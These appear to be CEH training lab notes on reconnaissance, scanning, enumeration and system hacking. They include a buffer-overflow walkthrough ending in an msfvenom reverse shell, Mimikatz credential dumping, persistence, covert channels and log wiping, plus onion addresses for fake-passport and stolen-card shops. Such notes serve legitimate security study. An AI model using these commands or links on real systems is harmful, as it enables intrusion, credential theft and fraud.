## Module 02: Footprinting and Reconnaissance
### Lab 1: Perform Footprinting Through Search Engines
#### Task 1: Gather Information using Advanced Google Hacking Techniques
- `intitle:login site:eccouncil.org`
- `EC-Council filetype:pdf ceh`
- cache / allinurl /  inurl / allintitle / inanchor / allinanchor / link / related / info / location
#### Task 2: Gather Information from Video Search Engine
- https://mattw.io/youtube-metadata/
- [Google videos](https://www.google.com/videohp)
- [Yahoo videos](https://in.video.search.yahoo.com)
- [EZGif](https://ezgif.com)
- [VideoReverser.com](https://www.videoreverser.com)
- [TinEye Reverse Image Search](https://tineye.com)
- [Yahoo Image Search](https://images.search.yahoo.com)
#### Task 3: Gather Information from FTP Search Engines
- https://www.searchftps.net/
- [FreewareWeb FTP File Search](https://www.freewareweb.com)
#### Task 4: Gather Information from IoT Search Engines
- https://www.shodan.io/
- [Censys](https://censys.io)

### Lab 2: Perform Footprinting Through Web Services
#### Task 1: Find the Company's Domains and Sub-domains using Netcraft
- https://www.netcraft.com
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [Pentest-Tools Find Subdomains](https://pentest-tools.com)
#### Task 2: Gather Personal Information using PeekYou Online People Search Service
- https://www.peekyou.com
- [Spokeo](https://www.spokeo.com)
- [pipl](https://pipl.com)
- [Intelius](https://www.intelius.com)
- [BeenVerified](https://www.beenverified.com)
#### Task 3: Gather an Email List using theHarvester
- `theHarvester -d microsoft.com -l 200 -b baidu`
#### Task 4: Gather Information using Deep and Dark Web Searching
- `Tor Browser`
- [The Hidden Wiki](http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki) is an onion site that works as a Wikipedia service of hidden websites.
- [FakeID](http://ymvhtqya23wqpez63gyc3ke4svju3mqsby2awnhd3bk2e65izt7baqad.onion) is an onion site for creating fake passports
- [Cardshop](http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion) is an onion site that sells cards with good balances
- [ExoneraTor](https://metrics.torproject.org)
- [OnionLand Search engine](https://onionlandsearchengine.com)
#### Task 5: Determine Target OS Through Passive Footprinting
- https://search.censys.io
- [Netcraft](https://www.netcraft.com)
- [Shodan](https://www.shodan.io)

### Lab 3: Perform Footprinting Through Social Networking Sites
#### Task 1: Gather Employees' Information from LinkedIn using theHarvester
- `theHarvester -d eccouncil -l 200 -b linkedin`
#### Task 2: Gather Personal Information from Various Social Networking Sites using Sherlock
- `sherlock "satya nadella"`
- [Social Searcher](https://www.social-searcher.com)
- [UserRecon](https://github.com/wishihab/userrecon)

### Lab 4: Perform Website Footprinting
#### Task 1: Gather Information About a Target Website using Ping Command Line Utility
- `ping www.certifiedhacker.com`
- `ping www.certifiedhacker.com -i 4 -n 1`
#### Task 2: Gather Information about a Target Website using Photon
- `python3 photon.py -u http://www.certifiedhacker.com`
- `python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback`
#### Task 3: Gather Information About a Target Website using Central Ops
- https://centralops.net
- [Website Informer](https://website.informer.com)
- [Burp Suite](https://portswigger.net)
- [Zaproxy](https://www.zaproxy.org)
#### Task 4: Extract a Company's Data using Web Data Extractor
- `Web Data Extractor`
- [ParseHub](https://www.parsehub.com)
- [SpiderFoot](https://www.spiderfoot.net)
#### Task 5: Mirror a Target Website using HTTrack Web Site Copier
- `HTTrack Web Site Copier`
- [Cyotek WebCopy](https://www.cyotek.com)
#### Task 6: Gather Information About a Target Website using GRecon
- `python3 grecon.py`
#### Task 7: Gather a Wordlist from the Target Website using CeWL
- `cewl -d 2 -m 5 https://www.certifiedhacker.com`
- `cewl -w wordlist.txt -d 2 -m 5 https://www.certifiedhacker.com`

### Lab 5: Perform Email Footprinting
#### Task 1: Gather Information about a Target by Tracing Emails using eMailTrackerPro
- `eMailTrackerPro`
- [Infoga](https://github.com/robertswin/Infoga)
- [Mailtrack](https://mailtrack.io)

### Lab 6: Perform Whois Footprinting
#### Task 1: Perform Whois Lookup using DomainTools
- http://whois.domaintools.com
- [SmartWhois](https://www.tamos.com)
- [Batch IP Converter](http://www.sabsoft.com)

### Lab 7: Perform DNS Footprinting
#### Task 1: Gather DNS Information using nslookup Command Line Utility and Online Tool
- ```cmd
  nslookup
  > set type=a
  > www.certifiedhacker.com
  > set type=cname
  > certifiedhacker.com
  ```
- http://www.kloth.net/services/nslookup.php
- [DNSdumpster](https://dnsdumpster.com)
- [DNS Records](https://network-tools.com)
#### Task 2: Perform Reverse DNS Lookup using Reverse IP Domain Check and DNSRecon
- https://www.yougetsignal.com
- `./dnsrecon.py -r 162.241.216.0-162.241.216.255`
#### Task 3: Gather Information of Subdomain and DNS Records using SecurityTrails
- https://securitytrails.com/
- [DNSChecker](https://dnschecker.org)
- [DNSdumpster](https://dnsdumpster.com)

### Lab 8: Perform Network Footprinting
#### Task 1: Locate the Network Range
- https://www.arin.net/about/welcome/region
#### Task 2: Perform Network Tracerouting in Windows and Linux Machines
- ```cmd
  tracert www.certifiedhacker.com
  tracert -h 5 www.certifiedhacker.com
  ```
  ```sh
  traceroute www.certifiedhacker.com
  ```
- [VisualRoute](http://www.visualroute.com)
- [Traceroute NG](https://www.solarwinds.com)

### Lab 9: Perform Footprinting using Various Footprinting Tools
#### Task 1: Footprinting a Target using Recon-ng
- `recon-ng`(`recon/domains-hosts/brute_hosts`,`recon/hosts-hosts/reverse_resolve`,`recon/domains-contacts/whois_pocs`,`recon/domains-hosts/hackertarget`,`reporting/html`)
#### Task 2: Footprinting a Target using Maltego
- `Maltego`
#### Task 3: Footprinting a Target using OSRFramework
- `OSRFramework`
  ```sh
  domainfy -n [Domain Name] -t all
  searchfy -q "target user name or profile name"
  ```
#### Task 4: Footprinting a Target using FOCA
- `FOCA`
#### Task 5: Footprinting a Target using BillCipher
- `python3 billcipher.py`
#### Task 6: Footprinting a Target using OSINT Framework
- https://osintframework.com/
- [Recon-Dog](https://github.com/s0md3v/ReconDog)
- [Th3Inspecto](https://github.com/Moham3dRiahi/Th3inspector)
- [Raccoon](https://github.com/evyatarmeged/Raccoon)



## Module 03: Scanning Networks
### Lab 1: Perform Host Discovery
#### Task 1: Perform Host Discovery using Nmap
- `nmap -sn -PR [Target IP Address]`
- `nmap -sn -PU [Target IP Address]`
- `nmap -sn -PE [Target IP Address]`
- `nmap -sn -PP [Target IP Address]`
- `nmap -sn -PM [target IP address]`
- `nmap -sn -PS [target IP address]`
- `nmap -sn -PA [target IP address]`
- `nmap -sn -PO [target IP address]`
#### Task 2: Perform Host Discovery using Angry IP Scanner
- `Angry IP Scanner`
- [SolarWinds Engineer's Toolset](https://www.solarwinds.com)
- [NetScanTools Pro](https://www.netscantools.com)
- [Colasoft Ping Tool](https://www.colasoft.com)
- [Visual Ping Tester](http://www.pingtester.net)
- [OpUtils](https://www.manageengine.com)

### Lab 2: Perform Port and Service Discovery
#### Task 1: Perform Port and Service Discovery using MegaPing
- `MegaPing`
#### Task 2: Perform Port and Service Discovery using NetScanTools Pro
- `NetScanTools Pro`
#### Task 3: Perform Port Scanning using sx Tool
- `sx arp [Target subnet] --json | tee arp.cache`
- `cat arp.cache | sx tcp -p 1-65535 [Target IP address]`
- `cat arp.cache | sx udp --json -p [Target Port] 10.10.1.11`
#### Task 4: Explore Various Network Scanning Techniques using Nmap
- `nmap -sT -v [Target IP Address]`
- `nmap -sS -v [Target IP Address]`
- `nmap -sX -v [Target IP Address]`
- `nmap -sM -v [Target IP Address]`
- `nmap -sA -v [Target IP Address]`
- `nmap -sU -v [Target IP Address]`
- `nmap -sN -v [target IP address`
- `nmap -sI -v [target IP address]`
- `nmap -sY -v [target IP address]`
- `nmap -sZ -v [target IP address`
- `nmap -sV [Target IP Address]`
- `nmap -A [Target Subnet]`
#### Task 5: Explore Various Network Scanning Techniques using Hping3
- `hping3 -A [Target IP Address] -p 80 -c 5`
- `hping3 -8 0-100 -S [Target IP Address] -V`
- `hping3 -F -P -U [Target IP Address] -p 80 -c 5`
- `hping3 --scan 0-100 -S [Target IP Address]`
- `hping3 -1 [Target IP Address] -p 80 -c 5`
- `hping3 -2 [Target IP Address] -p 80 -c 5`  

### Lab 3: Perform OS Discovery
#### Task 1: Identify the Target System's OS with Time-to-Live (TTL) and TCP Window Sizes using Wireshark
| Operating System | Time To Live | TCP Windows Size |
-|-|-
| linux         | 64  | 5840 |
| FreeBSD       | 64  | 65535 |
| OpenBSD       | 255 | 16384 |
| Windows       | 128 | 65535 bytes to 1 Gigabyte |
| Cisco Routers | 255 | 4128 |
| Solaris       | 255 | 8760 |
| AIX           | 255 | 16384 |
#### Task 2: Perform OS Discovery using Nmap Script Engine (NSE)
- `nmap -A [Target IP Address]`
- `nmap -O  [Target IP Address]`
- `nmap --script smb-os-discovery.nse [Target IP Address]`
#### Task 3: Perform OS Discovery using Unicornscan
- `unicornscan [Target IP Address] -Iv`

### Lab 4: Scan beyond IDS and Firewall
#### Task 1: Scan beyond IDS/Firewall using various Evasion Techniques
- `nmap -f [Target IP Address]`
- `nmap -g 80 [Target IP Address]`
- `nmap -mtu 8 [Target IP Address]`
- `nmap -D RND:10 [Target IP Address]`
- `nmap -sT -Pn --spoof-mac 0 [Target IP Address]`
#### Task 2: Create Custom Packets using Colasoft Packet Builder to Scan beyond the IDS/Firewall
- `Colasoft Packet Builder`
#### Task 3: Create Custom UDP and TCP Packets using Hping3 to Scan beyond the IDS/Firewall
- `hping3 [Target IP Address] --udp --rand-source --data 500`
- `hping3 -S [Target IP Address] -p 80 -c 5`
- `hping3 [Target IP Address] --flood`  
- [NetScanTools Pro](https://www.netscantools.com)
- [Colasoft packet builder](https://www.colasoft.com)

### Lab 5: Perform Network Scanning using Various Scanning Tools
#### Task 1: Scan a Target Network using Metasploit
- `auxiliary/scanner/portscan/syn`
- `auxiliary/scanner/portscan/tcp`
- `auxiliary/scanner/smb/smb_version`



## Module 04: Enumeration
### Lab 1: Perform NetBIOS Enumeration
#### Task 1: Perform NetBIOS Enumeration using Windows Command-Line Utilities
- `nbtstat -a`
- `nbtstat -c`
#### Task 2: Perform NetBIOS Enumeration using NetBIOS Enumerator
- `NetBIOS Enumerator`
#### Task 3: Perform NetBIOS Enumeration using an NSE Script
- `nmap -sV --script nbstat.nse  [Target IP Address]`
- [Global Network Inventory](http://www.magnetosoft.com)
- [Advanced IP Scanner](https://www.advanced-ip-scanner.com)
- [Hyena](https://www.systemtools.com)
- [Nsauditor Network Security Auditor(](https://www.nsauditor.com)

### Lab 2: Perform SNMP Enumeration
#### Task 1: Perform SNMP Enumeration using snmp-check
- `snmp-check [Target IP Address]`
#### Task 2: Perform SNMP Enumeration using SoftPerfect Network Scanner
- `SoftPerfect Network Scanner`
- [Network Performance Monitor](https://www.solarwinds.com)
- [OpUtils](https://www.manageengine.com)
- [PRTG Network Monitor](https://www.paessler.com)
- [Engineer's Toolset](https://www.solarwinds.com)
#### Task 3: Perform SNMP Enumeration using SnmpWalk
- `snmpwalk -v1 -c public [target IP]`
- `snmpwalk -v2c -c public [Target IP Address]`
#### Task 4: Perform SNMP Enumeration using Nmap
- `nmap -sU -p 161 --script=snmp-sysdescr [target IP Address]`
- `nmap -sU -p 161 --script=snmp-processes [target IP Address]`
- `nmap -sU -p 161 --script=snmp-win32-software [target IP Address]`
- `nmap -sU -p 161 --script=snmp-interfaces [target IP Address]`

### Lab 3: Perform LDAP Enumeration
#### Task 1: Perform LDAP Enumeration using Active Directory Explorer (AD Explorer)
- `Active Directory Explorer`
- [Softerra LDAP Administrator](https://www.ldapadministrator.com)
- [LDAP Admin Tool](https://www.ldapsoft.com)
- [LDAP Account Manager](https://www.ldap-account-manager.org)
- [LDAP Search](https://securityxploded.com)
#### Task 2: Perform LDAP Enumeration using Python and Nmap
- `nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [Target IP Address]`
- ```python3
  import ldap3
  server=ldap3.Server('[Target IP Address]', get_info=ldap3.ALL,port=[Target Port])
  connection=ldap3.Connection(server)
  connection.bind()
  server.info
  # can gather information such as naming context or domain name
  connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=*))', search_scope='SUBTREE', attributes='*')
  connection.entries
  # retrieve all the directory objects if result of connection.search is true
  connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=person))', search_scope='SUBTREE', attributes='userpassword')
  connection.entries
  # dump the entire LDAP information if result of connection.search is true
  ```
#### Task 3: Perform LDAP Enumeration using ldapsearch
- `ldapsearch -h [Target IP Address] -x -s base namingcontexts`
- `ldapsearch -h [Target IP Address] -x -b "DC=CEH,DC=com"`
- `ldapsearch -x -h [Target IP Address] -b "DC=CEH,DC=com" "objectclass=*"`

### Lab 4: Perform NFS Enumeration
#### Task 1: Perform NFS Enumeration using RPCScan and SuperEnum
- `./superenum`
- `python3 rpc-scan.py [Target IP address] --rpc`

### Lab 5: Perform DNS Enumeration
#### Task 1: Perform DNS Enumeration using Zone Transfer
- `dig ns [Target Domain]`
- `dig @[[NameServer]] [[Target Domain]] axfr`
- ```cmd
  nslookup
  > set querytype=soa
  > [Target Domain]`
  > ls -d [Name Server]
  ```
#### Task 2: Perform DNS Enumeration using DNSSEC Zone Walking
- `./dnsrecon.py -d [Target domain] -z`
- [LDNS](https://www.nlnetlabs.nl)
- [nsec3map](https://github.com/anonion0/nsec3map)
- [nsec3walker](https://dnscurve.org)
- [DNSwalk](https://github.com/davebarr/dnswalk)
#### Task 3: Perform DNS Enumeration using Nmap
- `nmap --script=broadcast-dns-service-discovery [Target Domain]`
- `nmap -T4 -p 53 --script dns-brute [Target Domain]`
- `nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='[Target Domain]'"`

### Lab 6: Perform SMTP Enumeration
#### Task 1: Perform SMTP Enumeration using Nmap
- `nmap -p 25 --script=smtp-enum-users [Target IP Address]`
- `nmap -p 25 --script=smtp-open-relay [Target IP Address]`
- `nmap -p 25 --script=smtp-commands [Target IP Address]`

### Lab 7: Perform RPC, SMB, and FTP Enumeration
#### Task 1: Perform SMB and RPC Enumeration using NetScanTools Pro
- `NetScanTools Pro`
#### Task 2: Perform RPC, SMB, and FTP Enumeration using Nmap
- `nmap -T4 -A [Target IP Address]`

### Lab 8: Perform Enumeration using Various Enumeration Tools
#### Task 1: Enumerate Information using Global Network Inventory
- `Global Network Inventory`
#### Task 2: Enumerate Network Resources using Advanced IP Scanner
- `Advanced IP Scanner`
#### Task 3: Enumerate Information from Windows and Samba Hosts using Enum4linux
- `enum4linux -u martin -p apple -n [Target IP Address]`
- `enum4linux -u martin -p apple -U [Target IP Address]`
- `enum4linux -u martin -p apple -o [Target IP Address]`
- `enum4linux -u martin -p apple -P [Target IP Address]`
- `enum4linux -u martin -p apple -G [Target IP Address]`
- `enum4linux -u martin -p apple -S [Target IP Address]`



## Module 05: Vulnerability Analysis
### Lab 1: Perform Vulnerability Research with Vulnerability Scoring Systems and Databases
#### Task 1: Perform Vulnerability Research in Common Weakness Enumeration (CWE)
- https://cwe.mitre.org/
#### Task 2: Perform Vulnerability Research in Common Vulnerabilities and Exposures (CVE)
- https://cve.mitre.org/
#### Task 3: Perform Vulnerability Research in National Vulnerability Database (NVD)
- https://nvd.nist.gov/

### Lab 2: Perform Vulnerability Assessment using Various Vulnerability Assessment Tools
#### Task 1: Perform Vulnerability Analysis using OpenVAS
- `OpenVAS`
#### Task 2: Perform Vulnerability Scanning using Nessus
- `Nessus`
#### Task 3: Perform Web Servers and Applications Vulnerability Scanning using CGI Scanner Nikto
- `nikto -h (Target Website) -Tuning x`
- `nikto -h (Target Website) -Cgidirs all`



## Module 06: System Hacking
### Lab 1: Gain Access to the System
#### Task 1: Perform Active Online Attack to Crack the System's Password using Responder
- `sudo responder -I eth0`
- `/usr/share/responder/logs`
- `john hash.txt`
#### Task 2: Audit System Passwords using L0phtCrack
- `l0phtcrack`
#### Task 3: Find Vulnerabilities on Exploit Sites
- https://www.exploit-db.com/
- [VulDB](https://vuldb.com)
- [MITRE CVE](https://cve.mitre.org)
- [Vulners](https://vulners.com)
- [CIRCL CVE Search](https://cve.circl.lu)
#### Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
- `C:\Users\Admin\Downloads>powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks`
#### Task 5: Gain Access to a Remote System using Armitage
- `service postgresql start`
- `armitage`
#### Task 6: Gain Access to a Remote System using Ninja Jonin
- `Ninja Jonin`
#### Task 7: Perform Buffer Overflow Attack to Gain Access to a Remote System
- [vulnserver](https://github.com/stephenbradshaw/vulnserver)にバッファオーバーフローを介したRCE  
  Immunityデバッガでvulnserver.exeのプロセスをアタッチして監視
- ```sh
  # vulnserver にアクセス
  nc -nv 10.10.1.11 9999
  # HELPコマンドによりSTATコマンドやTRUNコマンドを確認
  HELP
  STATS [stat_value]
  TRUN [trun_value]
  ```
- ```sh
  # Fuziing、デバッガで監視しているプロセスはRunnningであるため、STATSコマンドは脆弱ではなさそう
  echo 's_readline();\ns_string("STATS ");\ns_string_variable("0");' > stats.spk
  generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
  
  # Fuziing、途中でTCP接続が失敗する
  # デバッガで監視しているプロセスはPausedであり、EAX、ESP、EBP、EIPのスタックレジストが41(ASCII値のA)に上書きされていた、RUUNコマンドにバッファオーバフローの脆弱性がありそう
  # EIPレジスタを上書きできれば、シェルを取得できる
  echo 's_readline();\ns_string("TRUN ");\ns_string_variable("0");' > stats.spk
  generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
  ```
- [fuzzywuzzy.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/fuzzywuzzy.py)を実行してTURNコマンドの入力値が何バイトでクラッシュするのが確認する  
  デバッガでプロセスがPausedになった直後にfuzzywuzzy.pyを終了、Pythonのメッセージで2400バイトのデータを送信したことを確認できた、デバッガ上ではEIPレジスタは上書きされていなかった  
- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2410`で生成した文字列を[WIns_overflow.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIns_overflow.py)でターゲットに送信、デバッガ上でEIPレジスタが「386F4337」に上書きされていた  
  `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2410 -q 386F4337`で2003バイトのオフセット値であることが分かった、どうやら2003バイト以降がオーバーフローしている
- [sketchcharacters.py](https://github.com/FishyStix12/WHPython_v1.1/blob/main/sketchcharacters.py)でbadCharacters(0x01から0xff)があるか確認  
  コードを`shellcode = "A" * "2003" + B * 4 + badchars`に修正（2003は先ほどのオフセット値、4はEIP分のバイトサイズ）し実行  
  デバッガでESPを「Follow in Dump」してESP先のメモリを確認、sketchcharacters.pyで送信したbadCharactersはすべてメモリ内に格納されていたのでbadCharactersは無さそう
- EIP レジスタは、適切なメモリ保護設定のないモジュールがある場合に制御できる  
  メモリ保護がないモジュールを特定するために、mona.pyを「C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands」内にコピー、デバッガで`!mona modules`を実行  
  essfunc.dllが「Rebase」「SafeSEH」「ASLR」が無効になっていたので、このモジュール内の「JMP ESP」命令を使用したい
- `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`で「JMP ESP」のアセンブリが「FFE4」と判明  
  デバッガで`!mona find -s "\xff\xe4" -m essfunc.dll`実行、「JMP ESP」のアドレスは「0x625011af」と判明
- `msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`でシェルコード作成  
  [WIn_shellcode.py)](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIn_shellcode.py)のコード`shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 8 + overflow`になるように実行  
  （"\xaf\x11\x50\x62"は「JMP ESP」アドレスのリトルエンディアン、"\x90"はNOP命令、overflow変数はmsfvenomでシェルコード）　　
  「nc - lnvp 4444」でリッスン・無事リバースシェルを取得できた
  
### Lab 2: Perform Privilege Escalation to Gain Higher Privileges
#### Task 1: Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities
- `beRoot`
- `Seatbelt`
- meterpreter
  - `use exploit/windows/local/bypassuac_fodhelper`
  - `getsystem -t 1`
  - `run post/windows/gather/smart_hashdump`
  - `clearev`
#### Task 2: Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter
- meterpreter
  - `timestomp Secret.txt -m "02/11/2018 08:10:03"`
  - `keyscan_start`
- cmd
  - `sc queryex type=service state=all`
  - `netsh firewall show state`
  - `netsh firewall show config`
  - `wmic /node:"" product get name,version,vendor`
  - `wmic cpu get`
  - `wmic useraccount get name,sid`
#### Task 3: Escalate Privileges by Exploiting Vulnerability in pkexec
- CVE-2021-4034
#### Task 4: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
- meterpreter
  - `use exploit/windows/local/bypassuac_fodhelper`
  - `getsystem -t 1`
  - `use post/windows/manage/sticky_keys`
#### Task 5: Escalate Privileges to Gather Hashdump using Mimikatz
- meterpreter
  - `load kiwi`
  - `lsa_dump_sam`
  - `lsa_dump_secrets`
  - `password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password`

### Lab 3: Maintain Remote Access and Hide Malicious Activities
#### Task 1: User System Monitoring and Surveillance using Power Spy
- `Power Spy`
#### Task 2: User System Monitoring and Surveillance using Spytech SpyAgent
- `Spytech SpyAgent `
- [ACTIVTrak](https://activtrak.com)
- [Veriato Cerebral](https://www.veriato.com)
- [NetVizor](https://www.netvizor.net)
- [SoftActivity Monitor](https://www.softactivity.com)
#### Task 3: Hide Files using NTFS Streams
- ```cmd
  c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
  mklink backdoor.exe readme.txt:calc.exe
  backdoor.exe
  ```
#### Task 4: Hide Data using White Space Steganography
- ```cmd
  snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
  snow -C -p "magic" readme2.txt
  ```
#### Task 5: Image Steganography using OpenStego and StegOnline
- `OpenStego`
- https://stegonline.georgeom.net/upload
- [QuickStego](http://quickcrypto.com)
- [SSuite Picsel](https://www.ssuitesoft.com)
- [CryptaPix](https://www.briggsoft.com)
- [gifshuffle](http://www.darkside.com.au)
#### Task 6: Maintain Persistence by Abusing Boot or Logon Autostart Execution
- `C:\\ProgramData\\Start Menu\\Programs\\Startup`
#### Task 7: Maintain Domain Persistence by Exploiting Active Directory Objects
- ```cmd
  Import-Module ./powerview.psm1
  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
  Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs
  ```
- `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300`
#### Task 8: Privilege Escalation and Maintain Persistence using WMI
- ```sh
  Import-Module ./WMI-Persistence.ps1
  Install-Persistence -Trigger Startup -Payload [Reverseshell program]
#### Task 9: Covert Channels using Covert_TCP
- [covert.c](https://github.com/zaheercena/Covert-TCP-IP-Protocol)
- ```sh
  cc -o covert_tcp covert_tcp.c
  ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
  ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
  ```

### Lab 4: Clear Logs to Hide the Evidence of Compromise
#### Task 1: View, Enable, and Clear Audit Policies using Auditpol
- `auditpol /get /category:*`
- `auditpol /set /category:"system","account logon" /success:enable /failure:enable`
- `auditpol /clear /y`
#### Task 2: Clear Windows Machine Logs using Various Utilities
- ```cmd
  `wevtutil el`
  `wevtutil cl [log_name]`
  ```
- `cipher /w:[Drive or Folder or File Location`
#### Task 3: Clear Linux Machine Logs using the BASH Shell
- `export HISTSIZE=0`
- `history -c`
- `history -w`
- `shred ~/.bash_history`
#### Task 4: Hiding Artifacts in Windows and Linux Machines
- ```cmd
  attrib +h +s +r Test
  attrib -s -h -r Test
  ```
- `touch .Secret.txt`
#### Task 5: Clear Windows Machine Logs using CCleaner
- `CCleaner`
- [DBAN](https://dban.org)
- [Privacy Eraser](https://www.cybertronsoft.com)
- [Wipe](https://privacyroot.com)
- [BleachBit](https://www.bleachbit.org)
